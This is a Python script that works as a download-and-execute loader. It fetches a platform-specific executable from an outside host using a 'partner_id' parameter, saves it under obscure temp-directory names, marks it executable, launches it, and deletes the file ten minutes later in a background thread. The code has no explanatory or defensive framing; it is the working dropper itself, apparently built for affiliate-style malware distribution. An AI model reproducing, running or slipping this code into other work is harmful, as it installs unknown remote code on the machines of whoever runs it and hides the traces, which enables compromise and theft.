import argparse
import sys
import platform
import subprocess
import requests
import os
import tempfile
import threading
import time

parser = argparse.ArgumentParser()
parser.add_argument('-partner_id', required=True)
parser.add_argument('-no-menu', action='store_true')
args = parser.parse_args()

plat = 'win' if platform.system() == 'Windows' else 'linux'
url = f"https://papi.0x-team.sbs/download?partner_id={args.partner_id}&platform={plat}"

suffix = ".exe" if plat == 'win' else ""
temp_dir = tempfile.gettempdir()
# ensure our working subdirectory exists; use makedirs for compatibility with older
# Python versions since os.mkdir doesn't support exist_ok.
subdir = os.path.join(temp_dir, "shags546h")
try:
    os.makedirs(subdir, exist_ok=True)
except TypeError:
    # Python <3.2 fallback: manually check
    if not os.path.isdir(subdir):
        os.mkdir(subdir)
filename = os.path.join(subdir, f"fua80wjk{suffix}")

try:
    r = requests.get(url, stream=True, timeout=30)
    r.raise_for_status()
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(8192):
            f.write(chunk)
except Exception as e:
    sys.exit(f"Download failed: {e}")

if plat == 'linux':
    os.chmod(filename, 0o755)
    # quick sanity check: confirm we downloaded an ELF binary before trying to exec it.
    try:
        with open(filename, 'rb') as f:
            magic = f.read(4)
        if magic != b"\x7fELF":
            sys.exit("Downloaded file does not appear to be a valid ELF executable")
    except Exception:
        # if we can't read the file for some reason, proceed and let the exec error
        pass

cmd = [os.path.abspath(filename)]
if args.no_menu:
    cmd.append('-no-menu')

try:
    subprocess.Popen(cmd)
except OSError as e:
    sys.exit(f"Failed to execute downloaded file: {e}")

def delete_file_later(path, delay=600):
    time.sleep(delay)
    try:
        os.remove(path)
    except:
        pass

threading.Thread(target=delete_file_later, args=(filename,), daemon=True).start()